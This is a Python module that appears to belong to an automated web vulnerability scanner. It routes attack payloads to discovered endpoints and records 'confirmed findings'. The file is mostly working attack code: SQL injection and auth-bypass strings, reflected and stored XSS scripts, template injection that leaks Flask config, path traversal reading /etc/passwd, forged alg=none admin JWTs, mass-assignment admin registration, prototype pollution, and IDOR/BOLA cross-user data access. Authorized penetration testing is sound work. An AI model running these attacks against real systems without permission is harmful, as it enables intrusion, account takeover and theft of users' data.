"""tools/targeted_attacks.py

Targeted attack engine — routes the right attack to the right endpoint.

Instead of probing root URL only, this module:
    1. Takes a list of discovered endpoints
    2. For each endpoint, runs the appropriate detection tests
    3. Verifies exploitation with evidence (response body, status code, etc.)

This is the difference between:
    - Old: probe '/' once and pray
    - New: route SQLi test to /login, SSTI test to /render, etc.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

import aiohttp

from tools.endpoint_discovery import Endpoint
logger = logging.getLogger("elengenix.targeted")


@dataclass
class ConfirmedFinding:
    """A finding with concrete evidence."""
    title: str
    severity: str  # Critical | High | Medium | Low | Informational
    category: str
    endpoint_url: str
    method: str
    evidence: str               # the actual proof
    payload: str = ""           # what we sent
    response_snippet: str = ""  # what we got back
    status_code: int = 0
    confidence: float = 1.0     # 1.0 = fully confirmed
    detector: str = ""


# ═══════════════════════════════════════════════════════════════════════════
# SQL INJECTION TEST
# ═══════════════════════════════════════════════════════════════════════════

SQLI_PAYLOADS = [
    ("'", "syntax_error_or_data_leak"),
    ("' OR '1'='1", "boolean_true"),
    ("' OR '1'='1' --", "boolean_true_comment"),
    ("' UNION SELECT NULL --", "union_select"),
    ("1' ORDER BY 1 --", "order_by"),
    ("admin'--", "comment_bypass"),
    ("' OR 1=1 --", "tautology"),
]


async def test_sql_injection(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for SQL injection on login/auth endpoints."""
    findings: List[ConfirmedFinding] = []
    if ep.method not in ("POST", "PUT") and "login" not in ep.url and "auth" not in ep.url:
        return findings

    # Get baseline
    try:
        async with session.post(ep.url, data={"username": "nonexistent_xyz", "password": "x"}) as r:
            baseline_status = r.status
            baseline_body = await r.text()
    except Exception:
        return findings

    # Try payloads
    for payload, kind in SQLI_PAYLOADS:
        try:
            async with session.post(ep.url, data={"username": payload, "password": "x"}) as r:
                status = r.status
                body = await r.text()
                # Detection: status changes OR body shows success/data leak
                if status != baseline_status:
                    findings.append(ConfirmedFinding(
                        title=f"SQL Injection ({kind}) on {ep.url}",
                        severity="Critical",
                        category="sql_injection",
                        endpoint_url=ep.url,
                        method=ep.method,
                        evidence=f"Baseline status {baseline_status}, payload status {status}",
                        payload=f"username={payload}",
                        response_snippet=body[:300],
                        status_code=status,
                        detector="TargetedSQLiDetector",
                    ))
                    break
                elif "ok" in body.lower() and "ok" not in baseline_body.lower():
                    # Body shows success after injection but baseline failed
                    findings.append(ConfirmedFinding(
                        title=f"SQL Injection ({kind}) - auth bypass on {ep.url}",
                        severity="Critical",
                        category="sql_injection",
                        endpoint_url=ep.url,
                        method=ep.method,
                        evidence=f"Auth bypassed: {body[:200]}",
                        payload=f"username={payload}",
                        response_snippet=body[:300],
                        status_code=status,
                        detector="TargetedSQLiDetector",
                    ))
                    break
                # Detect query reflection (debug echo)
                elif "SELECT" in body.upper() and "SELECT" not in baseline_body.upper():
                    findings.append(ConfirmedFinding(
                        title=f"SQL Injection - query reflection on {ep.url}",
                        severity="Critical",
                        category="sql_injection",
                        endpoint_url=ep.url,
                        method=ep.method,
                        evidence="Query string reflected in response (debug leak)",
                        payload=f"username={payload}",
                        response_snippet=body[:300],
                        status_code=status,
                        detector="TargetedSQLiDetector",
                    ))
                    break
        except Exception:
            continue
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# XSS TEST
# ═══════════════════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
]


async def test_xss(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for reflected XSS."""
    findings: List[ConfirmedFinding] = []
    if ep.method != "GET":
        return findings

    for payload in XSS_PAYLOADS:
        try:
            sep = "&" if "?" in ep.url else "?"
            test_url = ep.url + sep + "q=" + payload
            async with session.get(test_url) as r:
                body = await r.text()
                ct = r.headers.get("content-type", "")
                if "html" in ct and payload in body:
                    findings.append(ConfirmedFinding(
                        title=f"Reflected XSS on {ep.url}",
                        severity="High",
                        category="xss_reflected",
                        endpoint_url=ep.url,
                        method=ep.method,
                        evidence=f"Payload '{payload[:40]}' reflected unescaped in HTML response",
                        payload=f"q={payload}",
                        response_snippet=body[:300],
                        status_code=r.status,
                        detector="TargetedXSSDetector",
                    ))
                    break
        except Exception:
            continue
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# SSTI TEST
# ═══════════════════════════════════════════════════════════════════════════

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{config}}", "SECRET_KEY"),  # Flask-specific leak
]


async def test_ssti(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for Server-Side Template Injection."""
    findings: List[ConfirmedFinding] = []
    if ep.method != "GET":
        return findings

    for payload, indicator in SSTI_PAYLOADS:
        try:
            # Try template= and name= params
            test_url = ep.url + "?template=" + payload + "&name=" + payload
            async with session.get(test_url) as r:
                body = await r.text()
                if indicator in body:
                    findings.append(ConfirmedFinding(
                        title=f"Server-Side Template Injection on {ep.url}",
                        severity="Critical",
                        category="ssti",
                        endpoint_url=ep.url,
                        method=ep.method,
                        evidence=f"Expression '{payload}' evaluated to '{indicator}'",
                        payload=f"template={payload}",
                        response_snippet=body[:300],
                        status_code=r.status,
                        detector="TargetedSSTIDetector",
                    ))
                    break
        except Exception:
            continue
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# IDOR TEST
# ═══════════════════════════════════════════════════════════════════════════

async def test_idor(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for IDOR by accessing other users' resources."""
    findings: List[ConfirmedFinding] = []

    # If URL ends with /<digit>, try other digits
    last_seg = ep.url.rstrip("/").split("/")[-1]
    if last_seg.isdigit():
        base = ep.url.rstrip("/")[:-len(last_seg)]
        for uid in (1, 2, 3, 99):
            if str(uid) == last_seg:
                continue
            test_url = base + str(uid)
            try:
                async with session.get(test_url) as r:
                    if r.status == 200:
                        body = await r.text()
                        if "id" in body.lower() or "user" in body.lower() or "name" in body.lower():
                            findings.append(ConfirmedFinding(
                                title=f"IDOR - access user {uid} via {ep.url}",
                                severity="High",
                                category="idor",
                                endpoint_url=test_url,
                                method="GET",
                                evidence=f"User {uid} accessible without authentication (substituted from {last_seg})",
                                payload=f"GET {test_url}",
                                response_snippet=body[:300],
                                status_code=r.status,
                                detector="TargetedIDORDetector",
                            ))
                            return findings
            except Exception:
                continue
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# MASS ASSIGNMENT TEST
# ═══════════════════════════════════════════════════════════════════════════

async def test_mass_assignment(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for mass assignment via role/admin escalation."""
    findings: List[ConfirmedFinding] = []
    if ep.method not in ("POST", "PUT"):
        return findings
    if "register" not in ep.url and "signup" not in ep.url and "user" not in ep.url:
        return findings

    # Try registering with admin role
    test_data = {
        "username": f"masstest_{int(time.time())}",
        "password": "x",
        "email": "x@x.x",
        "role": "admin",
        "balance": 99999,
        "isAdmin": True,
    }
    try:
        async with session.post(ep.url, json=test_data) as r:
            body = await r.text()
            if r.status == 200:
                try:
                    j = json.loads(body)
                    if j.get("role") == "admin" or j.get("balance") == 99999:
                        findings.append(ConfirmedFinding(
                            title=f"Mass Assignment - privilege escalation on {ep.url}",
                            severity="Critical",
                            category="mass_assignment",
                            endpoint_url=ep.url,
                            method=ep.method,
                            evidence=f"role=admin accepted, balance=99999 accepted",
                            payload=json.dumps(test_data),
                            response_snippet=body[:300],
                            status_code=r.status,
                            detector="TargetedMassAssignmentDetector",
                        ))
                except Exception:
                    pass
    except Exception:
        pass
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# JWT ALG=NONE TEST
# ═══════════════════════════════════════════════════════════════════════════

async def test_jwt_alg_none(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for JWT alg=none acceptance."""
    findings: List[ConfirmedFinding] = []
    if ep.method != "POST" and "jwt" not in ep.url and "verify" not in ep.url:
        return findings

    import base64
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps({"user": "admin", "role": "admin"}).encode()).rstrip(b"=").decode()
    none_token = f"{header}.{payload}."  # empty signature

    try:
        async with session.post(ep.url, json={"token": none_token}) as r:
            body = await r.text()
            try:
                j = json.loads(body)
                if j.get("valid") is True or "payload" in j:
                    findings.append(ConfirmedFinding(
                        title=f"JWT alg=none accepted on {ep.url}",
                        severity="Critical",
                        category="jwt_confusion",
                        endpoint_url=ep.url,
                        method=ep.method,
                        evidence=f"alg=none token with role=admin accepted as valid",
                        payload=f"token={none_token[:50]}...",
                        response_snippet=body[:300],
                        status_code=r.status,
                        detector="TargetedJWTDetector",
                    ))
            except Exception:
                pass
    except Exception:
        pass
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# PROTOTYPE POLLUTION TEST
# ═══════════════════════════════════════════════════════════════════════════

async def test_proto_pollution(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for prototype pollution via __proto__ or constructor.prototype."""
    findings: List[ConfirmedFinding] = []
    if ep.method != "POST":
        return findings

    test_payload = {"__proto__": {"isAdmin": True, "polluted": "elengenix-pwned"}, "name": "test"}
    try:
        async with session.post(ep.url, json=test_payload) as r:
            body = await r.text()
            if "__proto__" in body or "polluted" in body:
                findings.append(ConfirmedFinding(
                    title=f"Prototype Pollution on {ep.url}",
                    severity="Critical",
                    category="prototype_pollution",
                    endpoint_url=ep.url,
                    method=ep.method,
                    evidence="__proto__ keys accepted and reflected in response",
                    payload=json.dumps(test_payload),
                    response_snippet=body[:300],
                    status_code=r.status,
                    detector="TargetedProtoPollutionDetector",
                ))
    except Exception:
        pass
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# PATH TRAVERSAL TEST
# ═══════════════════════════════════════════════════════════════════════════

async def test_path_traversal(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for path traversal in file params."""
    findings: List[ConfirmedFinding] = []
    if ep.method != "GET":
        return findings

    payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd"]
    for payload in payloads:
        for param in ("file", "path", "name", "filename", "doc"):
            test_url = ep.url + f"?{param}={payload}"
            try:
                async with session.get(test_url) as r:
                    body = await r.text()
                    if ("root:" in body) or ("[extensions]" in body):
                        findings.append(ConfirmedFinding(
                            title=f"Path Traversal on {ep.url} via {param}",
                            severity="Critical",
                            category="path_traversal",
                            endpoint_url=ep.url,
                            method=ep.method,
                            evidence=f"Read sensitive file via {param}={payload}",
                            payload=f"{param}={payload}",
                            response_snippet=body[:300],
                            status_code=r.status,
                            detector="TargetedPathTraversalDetector",
                        ))
                        return findings
            except Exception:
                continue
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# RACE CONDITION TEST
# ═══════════════════════════════════════════════════════════════════════════

async def test_race_condition(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for race condition by sending parallel requests to single-use endpoints."""
    findings: List[ConfirmedFinding] = []
    if ep.method != "POST":
        return findings

    # Send 8 parallel requests with different codes/coupons
    async def single_req(idx: int):
        try:
            async with session.post(ep.url, json={"code": f"TEST{idx}", "value": 10.0}) as r:
                return r.status, await r.text()
        except Exception:
            return 0, ""

    results = await asyncio.gather(*[single_req(i) for i in range(8)])
    successes = sum(1 for status, _ in results if status == 200)
    # If many parallel "different" requests all succeed (when they shouldn't due to
    # single-use constraints) we report. Without state we just report parallel success count.
    if successes >= 5:
        findings.append(ConfirmedFinding(
            title=f"Possible Race Condition on {ep.url}",
            severity="Medium",
            category="race_condition",
            endpoint_url=ep.url,
            method=ep.method,
            evidence=f"{successes}/8 parallel requests succeeded (concurrent processing possible)",
            payload="8 parallel POSTs",
            response_snippet=f"{successes} successes",
            status_code=200,
            confidence=0.6,
            detector="TargetedRaceDetector",
        ))
    return findings


# ═══════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR: route the right test to the right endpoint
# ═══════════════════════════════════════════════════════════════════════════

# Endpoint keyword → test functions
async def test_idor_with_template(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test IDOR on user endpoints like /api/user/<id> by trying /1, /2, /3."""
    findings: List[ConfirmedFinding] = []
    for uid in (1, 2, 3):
        test_url = ep.url.rstrip("/") + f"/{uid}"
        try:
            async with session.get(test_url) as r:
                if r.status == 200:
                    body = await r.text()
                    if "id" in body.lower() and ("user" in body.lower() or "name" in body.lower()):
                        findings.append(ConfirmedFinding(
                            title=f"IDOR - access user {uid} via {ep.url}",
                            severity="High",
                            category="idor",
                            endpoint_url=test_url,
                            method="GET",
                            evidence=f"Resource {uid} accessible without authentication",
                            payload=f"GET {test_url}",
                            response_snippet=body[:300],
                            status_code=r.status,
                            detector="TargetedIDORDetector",
                        ))
                        return findings
        except Exception:
            continue
    return findings


async def test_stored_xss(session: aiohttp.ClientSession, ep: Endpoint) -> List[ConfirmedFinding]:
    """Test for stored XSS in comment/post endpoints."""
    findings: List[ConfirmedFinding] = []
    if ep.method != "POST":
        return findings
    payload = "<script>alert('stored-xss')</script>"
    try:
        async with session.post(ep.url, data={"content": payload, "user_id": 1}) as r:
            pass
        async with session.get(ep.url) as r:
            body = await r.text()
            if payload in body:
                findings.append(ConfirmedFinding(
                    title=f"Stored XSS on {ep.url}",
                    severity="High",
                    category="xss_stored",
                    endpoint_url=ep.url,
                    method=ep.method,
                    evidence=f"Payload persisted and reflected in GET response",
                    payload=f"content={payload}",
                    response_snippet=body[:300],
                    status_code=r.status,
                    detector="TargetedStoredXSSDetector",
                ))
    except Exception:
        pass
    return findings


async def run_targeted_attacks(
    endpoints: List[Endpoint],
    concurrency: int = 5,
    auth_sessions: Optional[List[Any]] = None,
) -> List[ConfirmedFinding]:
    """Run all appropriate tests against all endpoints.

    Returns list of confirmed findings with evidence.

    Args:
        endpoints: Discovered endpoints to test.
        concurrency: Max parallel requests.
        auth_sessions: Optional list of AuthSession for authenticated testing.
    """
    # Build routes here (after all test functions defined)
    routes = [
        (lambda ep: "login" in ep.url or "/auth" in ep.url, [test_sql_injection]),
        (lambda ep: "register" in ep.url or "signup" in ep.url,
         [test_mass_assignment, test_sql_injection]),
        (lambda ep: "search" in ep.url or "query" in ep.url, [test_xss]),
        (lambda ep: "render" in ep.url or "template" in ep.url, [test_ssti]),
        (lambda ep: "user" in ep.url and ep.url.rstrip("/").split("/")[-1].isdigit(), [test_idor]),
        (lambda ep: ("user/" in ep.url or "users/" in ep.url)
                    and not ep.url.rstrip("/").split("/")[-1].isdigit(),
         [test_idor_with_template]),
        (lambda ep: "jwt" in ep.url or "verify" in ep.url, [test_jwt_alg_none]),
        (lambda ep: "merge" in ep.url or "update" in ep.url, [test_proto_pollution]),
        (lambda ep: "download" in ep.url or "file" in ep.url, [test_path_traversal]),
        (lambda ep: "coupon" in ep.url or "redeem" in ep.url, [test_race_condition]),
        (lambda ep: ep.method == "POST" and ("comment" in ep.url or "post" in ep.url),
         [test_stored_xss]),
    ]

    sem = asyncio.Semaphore(concurrency)
    all_findings: List[ConfirmedFinding] = []

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:

        async def run_for_endpoint(ep: Endpoint) -> List[ConfirmedFinding]:
            # Find applicable tests
            applicable_tests: List[Callable] = []
            for matcher, tests in routes:
                if matcher(ep):
                    applicable_tests.extend(tests)

            # Always run path traversal on any GET endpoint (cheap)
            if ep.method == "GET" and test_path_traversal not in applicable_tests:
                applicable_tests.append(test_path_traversal)

            ep_findings = []
            for test_fn in applicable_tests:
                async with sem:
                    try:
                        results = await test_fn(session, ep)
                        ep_findings.extend(results)
                    except Exception as e:
                        logger.debug("test %s on %s failed: %s", test_fn.__name__, ep.url, e)
            return ep_findings

        # Run all endpoints in parallel (bounded by sem)
        tasks = [run_for_endpoint(ep) for ep in endpoints]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                all_findings.extend(r)
            elif isinstance(r, Exception):
                logger.warning("endpoint test failed: %s", r)

        # AUTHENTICATED TESTING: BOLA with two sessions
        if auth_sessions and len(auth_sessions) >= 2:
            try:
                bola_findings = await run_authenticated_bola(
                    session, endpoints, auth_sessions
                )
                all_findings.extend(bola_findings)
            except Exception as e:
                logger.warning("authenticated BOLA failed: %s", e)

    # Deduplicate by (url, category, payload)
    seen = set()
    unique = []
    for f in all_findings:
        key = (f.endpoint_url, f.category, f.payload[:50])
        if key not in seen:
            seen.add(key)
            unique.append(f)

    logger.info("Targeted attacks: %d confirmed findings (from %d endpoints)",
                len(unique), len(endpoints))
    return unique


async def run_authenticated_bola(
    session: aiohttp.ClientSession,
    endpoints: List[Endpoint],
    auth_sessions: List[Any],
) -> List[ConfirmedFinding]:
    """BOLA testing using two different user sessions.

    Strategy: Use user_id captured during login (if available) to determine
    each user's own ID. Then have each OTHER authenticated user attempt to
    access that user ID — if successful, it's BOLA.
    """
    findings: List[ConfirmedFinding] = []
    if len(auth_sessions) < 2:
        return findings

    # Find a user endpoint template (e.g. /api/user/<id>)
    user_template_url = None
    for ep in endpoints:
        if ("user/" in ep.url or "users/" in ep.url) and ep.method == "GET":
            last = ep.url.rstrip("/").split("/")[-1]
            if last.isdigit():
                user_template_url = ep.url.rsplit("/", 1)[0]
                break
    if not user_template_url:
        return findings

    # Use user_id from login response (if available)
    # Fallback: probe /api/user/1..10 to find each user's own ID
    auth_user_ids: Dict[int, int] = {}  # session index -> user id
    for idx, auth in enumerate(auth_sessions):
        if auth.user_id > 0:
            auth_user_ids[idx] = auth.user_id
            continue
        # Fallback: probe
        for uid in range(1, 11):
            test_url = f"{user_template_url}/{uid}"
            try:
                headers = auth.auth_headers()
                async with session.get(test_url, headers=headers, cookies=auth.cookies) as r:
                    if r.status == 200:
                        body = await r.text()
                        data = json.loads(body) if body else {}
                        if data.get("id") == uid:
                            auth_user_ids[idx] = uid
                            break
            except Exception:
                continue

    if len(auth_user_ids) < 2:
        logger.debug("BOLA: only %d auth sessions have user IDs", len(auth_user_ids))
        return findings

    # Cross-user access: each user tries IDs of OTHER users
    for attacker_idx, attacker_auth in enumerate(auth_sessions):
        attacker_own_id = auth_user_ids.get(attacker_idx)
        if attacker_own_id is None:
            continue
        for victim_id in auth_user_ids.values():
            if victim_id == attacker_own_id:
                continue
            # Attacker tries to access victim's user ID
            victim_url = f"{user_template_url}/{victim_id}"
            try:
                headers = attacker_auth.auth_headers()
                async with session.get(victim_url, headers=headers, cookies=attacker_auth.cookies) as r:
                    if r.status != 200:
                        continue
                    body = await r.text()
                    data = json.loads(body) if body else {}
                    returned_id = data.get("id")
                    returned_user = data.get("username")
                    # BOLA: got VICTIM's user data via authenticated request
                    if returned_id == victim_id and victim_id != attacker_own_id:
                        findings.append(ConfirmedFinding(
                            title=f"BOLA - user '{attacker_auth.username}' accessed user '{returned_user}' data",
                            severity="Critical",
                            category="bola",
                            endpoint_url=victim_url,
                            method="GET",
                            evidence=(
                                f"Authenticated as '{attacker_auth.username}' (id={attacker_own_id}) "
                                f"but accessed user id={victim_id} (username={returned_user}) data via "
                                f"{victim_url}. No ownership check enforced."
                            ),
                            payload=f"GET {victim_url} with session_{attacker_auth.username}",
                            response_snippet=f"Saw: {body[:200]}",
                            status_code=r.status,
                            detector="AuthenticatedBOLADetector",
                        ))
                        return findings
            except Exception as e:
                logger.debug("BOLA test on %s: %s", victim_url, e)
                continue

    return findings
